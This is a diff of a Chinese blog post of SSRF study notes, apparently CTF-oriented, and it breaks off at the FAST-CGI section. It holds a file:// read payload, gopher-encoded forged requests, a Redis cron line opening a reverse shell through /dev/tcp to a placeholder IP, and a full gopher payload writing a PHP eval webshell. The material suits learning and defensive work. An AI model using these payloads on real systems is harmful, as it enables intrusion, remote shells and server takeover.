@@ -11,7 +11,7 @@
   <meta itemprop="name" content="SSRF笔记">
   <meta itemprop="datePublished" content="2024-08-15T09:31:01+08:00">
   <meta itemprop="dateModified" content="2024-08-15T09:31:01+08:00">
-  <meta itemprop="wordCount" content="428">
+  <meta itemprop="wordCount" content="412">
   <meta itemprop="keywords" content="OWASP,SSRF"><meta property="og:url" content="https://dongyu29.github.io/posts/owasp/ssrf/119/">
   <meta property="og:site_name" content="东隅 Blog">
   <meta property="og:title" content="SSRF笔记">
@@ -37,7 +37,7 @@
     "mainEntityOfPage": {
       "@type": "WebPage",
       "@id": "https:\/\/dongyu29.github.io\/posts\/owasp\/ssrf\/119\/"
-    },"image": ["https:\/\/raw.githubusercontent.com\/dongyu29\/dongyu29.github.io\/main\/favicon.ico"],"genre": "posts","keywords": "OWASP, SSRF","wordcount":  428 ,
+    },"image": ["https:\/\/raw.githubusercontent.com\/dongyu29\/dongyu29.github.io\/main\/favicon.ico"],"genre": "posts","keywords": "OWASP, SSRF","wordcount":  412 ,
     "url": "https:\/\/dongyu29.github.io\/posts\/owasp\/ssrf\/119\/","datePublished": "2024-08-15T09:31:01+08:00","dateModified": "2024-08-15T09:31:01+08:00","publisher": {
       "@type": "Organization",
       "name": "","logo": "https:\/\/raw.githubusercontent.com\/dongyu29\/dongyu29.github.io\/main\/favicon.ico"},"author": {
@@ -144,7 +144,7 @@
   <article class="page single">
     <div class="header"><h1 class="single-title animate__animated animate__flipInX"><span title="Repost" class="icon-repost"><i class="fa-solid x" aria-hidden="true"></i></span><span>SSRF笔记</span>
       </h1></div><div class="post-meta">
-      <div class="post-meta-line"><span class="post-author"><span class="author"><img loading="lazy" src="https://raw.githubusercontent.com/dongyu29/dongyu29.github.io/main/favicon.ico" alt="东隅" data-title="东隅" width="20" height="20" class="avatar" style="background: url(/images/loading.min.svg) no-repeat center;" onload="this.title=this.dataset.title;for(const i of ['style', 'data-title','onerror','onload']){this.removeAttribute(i);}this.dataset.lazyloaded='';" onerror="this.title=this.dataset.title;for(const i of ['style', 'data-title','onerror','onload']){this.removeAttribute(i);}"/>&nbsp;东隅</span></span><span class="post-included-in">&nbsp;included in <a href="/categories/owasp/" class="post-category" title="Category - OWASP"><i class="fa-regular fa-folder fa-fw" aria-hidden="true"></i> OWASP</a></span></div><div class="post-meta-line"><span title="published on 2024-08-15 09:31:01"><i class="fa-solid fa-calendar-days fa-fw me-1" aria-hidden="true"></i><time datetime="2024-08-15">2024-08-15</time></span>&nbsp;<span title="428 words"><i class="fa-solid fa-pencil-alt fa-fw me-1" aria-hidden="true"></i>About 500 words</span>&nbsp;<span><i class="fa-regular fa-clock fa-fw me-1" aria-hidden="true"></i>3 minutes</span>&nbsp;</div>
+      <div class="post-meta-line"><span class="post-author"><span class="author"><img loading="lazy" src="https://raw.githubusercontent.com/dongyu29/dongyu29.github.io/main/favicon.ico" alt="东隅" data-title="东隅" width="20" height="20" class="avatar" style="background: url(/images/loading.min.svg) no-repeat center;" onload="this.title=this.dataset.title;for(const i of ['style', 'data-title','onerror','onload']){this.removeAttribute(i);}this.dataset.lazyloaded='';" onerror="this.title=this.dataset.title;for(const i of ['style', 'data-title','onerror','onload']){this.removeAttribute(i);}"/>&nbsp;东隅</span></span><span class="post-included-in">&nbsp;included in <a href="/categories/owasp/" class="post-category" title="Category - OWASP"><i class="fa-regular fa-folder fa-fw" aria-hidden="true"></i> OWASP</a></span></div><div class="post-meta-line"><span title="published on 2024-08-15 09:31:01"><i class="fa-solid fa-calendar-days fa-fw me-1" aria-hidden="true"></i><time datetime="2024-08-15">2024-08-15</time></span>&nbsp;<span title="412 words"><i class="fa-solid fa-pencil-alt fa-fw me-1" aria-hidden="true"></i>About 500 words</span>&nbsp;<span><i class="fa-regular fa-clock fa-fw me-1" aria-hidden="true"></i>2 minutes</span>&nbsp;</div>
     </div><div class="details toc" id="toc-static" data-kept="false">
         <div class="details-summary toc-title">
           <span>Contents</span>
@@ -152,18 +152,38 @@
         </div>
         <div class="details-content toc-content" id="toc-content-static"><nav id="TableOfContents">
   <ul>
-    <li>
+    <li><a href="#http">http</a></li>
+    <li><a href="#dict协议">dict协议</a></li>
+    <li><a href="#file伪协议">file伪协议</a></li>
+    <li><a href="#gopher协议">Gopher协议</a></li>
+  </ul>
+
+  <ul>
+    <li><a href="#redis">redis</a>
       <ul>
-        <li></li>
+        <li><a href="#理论">理论</a></li>
+        <li><a href="#攻击">攻击</a></li>
+      </ul>
+    </li>
+    <li><a href="#mysql">mysql</a>
+      <ul>
+        <li><a href="#攻击实现原理">攻击实现原理</a></li>
+      </ul>
+    </li>
+    <li><a href="#fast-cgi">FAST-CGI</a>
+      <ul>
+        <li><a href="#理论-1">理论</a></li>
+        <li><a href="#攻击实现原理-1">攻击实现原理</a></li>
+        <li><a href="#这里有一个利用ssrf302跳转打本地fpm的例子">这里有一个利用ssrf302跳转打本地fpm的例子</a></li>
       </ul>
     </li>
   </ul>
 </nav></div>
-      </div><div class="content" id="content" data-end-flag="-----（完）-----"><h5 id="基础" class="heading-element"><span>0.0.0.1  基础</span>
+      </div><div class="content" id="content" data-end-flag="-----（完）-----"><h1 id="基础" class="heading-element"><span>基础</span>
   <a href="#%e5%9f%ba%e7%a1%80" class="heading-mark">
     <svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"></path></svg>
   </a>
-</h5><p>SSRF(服务端请求伪造漏洞) 由于服务端提供了从其他服务器应用获取数据的功能,但又没有对目标地址做严格过滤与限制，导致攻击者可以传入任意的地址来让后端服务器对其发起请求,并返回对该目标地址请求的数据。</p>
+</h1><p>SSRF(服务端请求伪造漏洞) 由于服务端提供了从其他服务器应用获取数据的功能,但又没有对目标地址做严格过滤与限制，导致攻击者可以传入任意的地址来让后端服务器对其发起请求,并返回对该目标地址请求的数据。</p>
 <p>一般情况下，SSRF针对的都是一些外网无法访问的内网，所以需要SSRF使目标后端去访问内网，进而达到我们攻击内网的目的。</p>
 <p>通过SSRF，我们可以访问目标内网的redis服务，mysql服务，smpt服务，fastcgi服务等</p>
 <p>造成漏洞的一些函数</p>
@@ -204,35 +224,35 @@
 </span></span></span><span style="display:flex;"><span><span style="color:#828b96;font-style:italic"></span><span style="color:#58a1dd">curl_close</span>(<span style="color:#58a1dd">$ch</span>); <span style="color:#828b96;font-style:italic">//关闭curl资源
 </span></span></span><span style="display:flex;"><span><span style="color:#828b96;font-style:italic"></span><span style="color:#ff636f">echo</span> (<span style="color:#58a1dd">$result</span>); 
 </span></span><span style="display:flex;"><span><span style="color:#828b96;font-style:italic">?&gt;</span>
-</span></span></code></pre></div><h5 id="ssrf攻击中涉及的一些协议" class="heading-element"><span>0.0.0.2  SSRF攻击中涉及的一些协议</span>
+</span></span></code></pre></div><h1 id="ssrf攻击中涉及的一些协议" class="heading-element"><span>SSRF攻击中涉及的一些协议</span>
   <a href="#ssrf%e6%94%bb%e5%87%bb%e4%b8%ad%e6%b6%89%e5%8f%8a%e7%9a%84%e4%b8%80%e4%ba%9b%e5%8d%8f%e8%ae%ae" class="heading-mark">
     <svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"></path></svg>
   </a>
-</h5><h6 id="http" class="heading-element"><span>0.0.0.2.1  http</span>
+</h1><h2 id="http" class="heading-element"><span>http</span>
   <a href="#http" class="heading-mark">
     <svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"></path></svg>
   </a>
-</h6><p>直接http访问</p>
-<h6 id="dict协议" class="heading-element"><span>0.0.0.2.2  dict协议</span>
+</h2><p>直接http访问</p>
+<h2 id="dict协议" class="heading-element"><span>dict协议</span>
   <a href="#dict%e5%8d%8f%e8%ae%ae" class="heading-mark">
     <svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"></path></svg>
   </a>
-</h6><p><em>在SSRF中，dict协议与http协议可用来探测内网的主机存活与端口开放情况。</em></p>
+</h2><p><em>在SSRF中，dict协议与http协议可用来探测内网的主机存活与端口开放情况。</em></p>
 <p>先判断哪个端口存在web服务</p>
 <p>这里是直接用burp爆破端口就可以</p>
 <p><img loading="lazy" src="https://my-pic-1309722427.cos.ap-nanjing.myqcloud.com/img/pictures-master/202303281000862.png" alt="image-20230328100031810" srcset="https://my-pic-1309722427.cos.ap-nanjing.myqcloud.com/img/pictures-master/202303281000862.png?size=small, https://my-pic-1309722427.cos.ap-nanjing.myqcloud.com/img/pictures-master/202303281000862.png?size=medium 1.5x, https://my-pic-1309722427.cos.ap-nanjing.myqcloud.com/img/pictures-master/202303281000862.png?size=large 2x" data-title="image-20230328100031810" style="background: url(/images/loading.min.svg) no-repeat center;" onload="this.title=this.dataset.title;for(const i of ['style', 'data-title','onerror','onload']){this.removeAttribute(i);}this.dataset.lazyloaded='';" onerror="this.title=this.dataset.title;for(const i of ['style', 'data-title','onerror','onload']){this.removeAttribute(i);}"/></p>
-<h6 id="file伪协议" class="heading-element"><span>0.0.0.2.3  file伪协议</span>
+<h2 id="file伪协议" class="heading-element"><span>file伪协议</span>
   <a href="#file%e4%bc%aa%e5%8d%8f%e8%ae%ae" class="heading-mark">
     <svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"></path></svg>
   </a>
-</h6><p>file为协议就不用多说了</p>
+</h2><p>file为协议就不用多说了</p>
 <p>payload：<code>?url=file:/var/www/html/flag.php</code></p>
 <p>但是需要知道文件具体位置才能读到敏感信息。</p>
-<h6 id="gopher协议" class="heading-element"><span>0.0.0.2.4  Gopher协议</span>
+<h2 id="gopher协议" class="heading-element"><span>Gopher协议</span>
   <a href="#gopher%e5%8d%8f%e8%ae%ae" class="heading-mark">
     <svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"></path></svg>
   </a>
-</h6><blockquote>
+</h2><blockquote>
 <p>gopher协议支持发出GET、POST请求：可以先拦截get请求包和post请求包，再构造成符合gopher协议的请求。gopher协议是ssrf利用中一个最强大的协议（俗称万能协议）。</p>
 <p>可以攻击内网的 FTP、Telnet、Redis、Memcache，也可以进行 GET、POST 请求，还可以攻击内网未授权MySQL。</p>
 <p><code>curl</code>是支持<code>gopher协议</code>的，所以这也是<code>curl_exec()</code>容易出现漏洞的地方</p>
@@ -266,11 +286,11 @@ key=00f001523d0b955749ea5e3b0ca09b5f</code></pre><p>然后我们就可以进行u
 <p>第一次编码：</p>
 <pre tabindex="0"><code>gopher://127.0.0.1:80/_POST%20/flag.php%20HTTP/1.1%0AHost:%20127.0.0.1:80%0AContent-Type:%20application/x-www-form-urlencoded%0AContent-Length:%2036%0A%0Akey=f1688c97bf2e6dda47be87e4d8f87cd7</code></pre><p>把%0A替换成%0d%0A，结尾加上%0d%0A,并且末尾要加上%0d%0a（\r\n）</p>
 <pre tabindex="0"><code>gopher://127.0.0.1:80/_POST%20/flag.php%20HTTP/1.1%0d%0AHost:%20127.0.0.1:80%0d%0AContent-Type:%20application/x-www-form-urlencoded%0d%0AContent-Length:%2036%0d%0A%0d%0Akey=f1688c97bf2e6dda47be87e4d8f87cd7%0d%0a</code></pre><p>然后在进行一次URL编码</p>
-<pre tabindex="0"><code>gopher%3A//127.0.0.1%3A80/_POST%2520/flag.php%2520HTTP/1.1%250D%250AHost%253A%2520127.0.0.1%250D%25</code></pre><h5 id="ssrf打内网" class="heading-element"><span>0.0.0.3  SSRF打内网</span>
+<pre tabindex="0"><code>gopher%3A//127.0.0.1%3A80/_POST%2520/flag.php%2520HTTP/1.1%250D%250AHost%253A%2520127.0.0.1%250D%25</code></pre><h1 id="ssrf打内网" class="heading-element"><span>SSRF打内网</span>
   <a href="#ssrf%e6%89%93%e5%86%85%e7%bd%91" class="heading-mark">
     <svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"></path></svg>
   </a>
-</h5><p>存在ssrf漏洞的站点主要利用四个协议，分别是http、file、gopher、dict协议。</p>
+</h1><p>存在ssrf漏洞的站点主要利用四个协议，分别是http、file、gopher、dict协议。</p>
 <p>file协议拿来进行本地文件的读取，http协议拿来进行内网的ip扫描、端口探测，如果探测到6379端口，那么可以利用http、gopher、dict这几个协议来打开放6379端口的redis服务（一般开放了这个端口的是redis服务），原理是利用他们以目标机的身份执行对开启redis服务的内网机执行redis命令，最后反弹shell到我们的公网ip机上。</p>
 <ul>
 <li>redis</li>
@@ -291,17 +311,23 @@ key=00f001523d0b955749ea5e3b0ca09b5f</code></pre><p>然后我们就可以进行u
 <p><img loading="lazy" src="C:/Users/HP/AppData/Roaming/Typora/typora-user-images/1666629843369.png" alt="1666629843369" srcset="C:/Users/HP/AppData/Roaming/Typora/typora-user-images/1666629843369.png?size=small, C:/Users/HP/AppData/Roaming/Typora/typora-user-images/1666629843369.png?size=medium 1.5x, C:/Users/HP/AppData/Roaming/Typora/typora-user-images/1666629843369.png?size=large 2x" data-title="1666629843369" style="background: url(/images/loading.min.svg) no-repeat center;" onload="this.title=this.dataset.title;for(const i of ['style', 'data-title','onerror','onload']){this.removeAttribute(i);}this.dataset.lazyloaded='';" onerror="this.title=this.dataset.title;for(const i of ['style', 'data-title','onerror','onload']){this.removeAttribute(i);}"/></p>
 <p>使用说明：</p>
 <p><a href="https://spyclub.tech/2018/08/14/2018-08-14-blog-on-gopherus/"target="_blank" rel="external nofollow noopener noreferrer">https://spyclub.tech/2018/08/14/2018-08-14-blog-on-gopherus/</a></p>
-<h6 id="redis" class="heading-element"><span>0.0.0.3.1  redis</span>
+<h2 id="redis" class="heading-element"><span>redis</span>
   <a href="#redis" class="heading-mark">
     <svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"></path></svg>
   </a>
-</h6><p>#######  理论</p>
-<p>首先要知道redis是个啥，起什么作用</p>
+</h2><h3 id="理论" class="heading-element"><span>理论</span>
+  <a href="#%e7%90%86%e8%ae%ba" class="heading-mark">
+    <svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"></path></svg>
+  </a>
+</h3><p>首先要知道redis是个啥，起什么作用</p>
 <p>看宝塔里面的redis安装说明，貌似这个就是一种数据库，那么ssrf打redis和mysql应该是有类似的效果</p>
 <p><img loading="lazy" src="https://my-pic-1309722427.cos.ap-nanjing.myqcloud.com/img/pictures-master/202303281011914.png" alt="1666189235250" srcset="https://my-pic-1309722427.cos.ap-nanjing.myqcloud.com/img/pictures-master/202303281011914.png?size=small, https://my-pic-1309722427.cos.ap-nanjing.myqcloud.com/img/pictures-master/202303281011914.png?size=medium 1.5x, https://my-pic-1309722427.cos.ap-nanjing.myqcloud.com/img/pictures-master/202303281011914.png?size=large 2x" data-title="1666189235250" style="background: url(/images/loading.min.svg) no-repeat center;" onload="this.title=this.dataset.title;for(const i of ['style', 'data-title','onerror','onload']){this.removeAttribute(i);}this.dataset.lazyloaded='';" onerror="this.title=this.dataset.title;for(const i of ['style', 'data-title','onerror','onload']){this.removeAttribute(i);}"/>redis常见漏洞利用https://www.freebuf.com/articles/network/280984.html</p>
 <p>在SSRF漏洞中，如果通过端口扫描等方法发现目标主机上开放6379端口，则目标主机上很有可能存在Redis服务。此时，如果目标主机上的Redis由于没有设置密码认证、没有进行添加防火墙等原因存在未授权访问漏洞的话，那我们就可以利用Gopher协议远程操纵目标主机上的Redis，可以利用 Redis 自身的提供的 config 命令像目标主机写WebShell、写SSH公钥、创建计划任务反弹Shell等…..</p>
-<p>#######  攻击</p>
-<ul>
+<h3 id="攻击" class="heading-element"><span>攻击</span>
+  <a href="#%e6%94%bb%e5%87%bb" class="heading-mark">
+    <svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"></path></svg>
+  </a>
+</h3><ul>
 <li>
 <p>写进定时任务</p>
 <pre tabindex="0"><code>主要依靠如下redis命令
@@ -379,12 +405,15 @@ flushallset 1 &#39;\n\n*/1 * * * * bash -i &gt;&amp; /dev/tcp/反弹IP/反弹端
 </span></span><span style="display:flex;"><span><span style="color:#58a1dd">config</span> <span style="color:#58a1dd">set</span> <span style="color:#58a1dd">dbfilename</span> <span style="color:#58a1dd">shell</span><span style="color:#ff636f">.</span><span style="color:#58a1dd">php</span>
 </span></span><span style="display:flex;"><span><span style="color:#58a1dd">save</span></span></span></code></pre></div><p>payload</p>
 <div class="highlight"><pre tabindex="0" style="color:#1d2432;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-php" data-lang="php"><span style="display:flex;"><span><span style="color:#58a1dd">gopher</span><span style="color:#ff636f">%</span><span style="color:#a6be9d">3</span><span style="color:#58a1dd">A</span><span style="color:#828b96;font-style:italic">//127.0.0.1%3A6379/_%252A1%250D%250A%25248%250D%250Aflushall%250D%250A%252A3%250D%250A%25243%250D%250Aset%250D%250A%25241%250D%250A1%250D%250A%252435%250D%250A%250A%250A%253C%253Fphp%2520eval%2528%2524_POST%255B%2522whoami%2522%255D%2529%253B%253F%253E%250A%250A%250D%250A%252A4%250D%250A%25246%250D%250Aconfig%250D%250A%25243%250D%250Aset%250D%250A%25243%250D%250Adir%250D%250A%252413%250D%250A/var/www/html%250D%250A%252A4%250D%250A%25246%250D%250Aconfig%250D%250A%25243%250D%250Aset%250D%250A%252410%250D%250Adbfilename%250D%250A%25249%250D%250Ashell.php%250D%250A%252A1%250D%250A%25244%250D%250Asave%250D%250A
-</span></span></span></code></pre></div><h6 id="mysql" class="heading-element"><span>0.0.0.3.2  mysql</span>
+</span></span></span></code></pre></div><h2 id="mysql" class="heading-element"><span>mysql</span>
   <a href="#mysql" class="heading-mark">
     <svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"></path></svg>
   </a>
-</h6><p>#######  攻击实现原理</p>
-<p>我觉得首先学习mysql写shell</p>
+</h2><h3 id="攻击实现原理" class="heading-element"><span>攻击实现原理</span>
+  <a href="#%e6%94%bb%e5%87%bb%e5%ae%9e%e7%8e%b0%e5%8e%9f%e7%90%86" class="heading-mark">
+    <svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"></path></svg>
+  </a>
+</h3><p>我觉得首先学习mysql写shell</p>
 <p><a href="https://www.cnblogs.com/zztac/p/11371149.html"target="_blank" rel="external nofollow noopener noreferrer">https://www.cnblogs.com/zztac/p/11371149.html</a></p>
 <p><a href="https://paper.seebug.org/510/"target="_blank" rel="external nofollow noopener noreferrer">https://paper.seebug.org/510/</a></p>
 <p>比较常用的，其实也没啥神秘的，不过是把查询到的数据进行一个导出，我们在查的东西里面写一下一句话木马，这个木马就会出现在我们查询的数据表里，如果能导出为php文件就万事大吉了</p>
@@ -392,19 +421,25 @@ flushallset 1 &#39;\n\n*/1 * * * * bash -i &gt;&amp; /dev/tcp/反弹IP/反弹端
 <p>大概了解了一下，客户端连接mysql有两种，一种是有密码，一种是无密码， 所以在非交互模式下登录并操作MySQL只能在无需密码认证，未授权情况下进行，这里利用SSRF漏洞攻击MySQL也是在其未授权情况下进行的。</p>
 <p>进行mysql查询的时候同样有数据包交互，我们要做的就是伪造这种数据包交互，进行curl，当然，这种我们伪造的数据包是利用gopher协议进行发送的</p>
 <p>curl gopher://127.0.0.1/_XXXXXX   大概像这样</p>
-<h6 id="fast-cgi" class="heading-element"><span>0.0.0.3.3  FAST-CGI</span>
+<h2 id="fast-cgi" class="heading-element"><span>FAST-CGI</span>
   <a href="#fast-cgi" class="heading-mark">
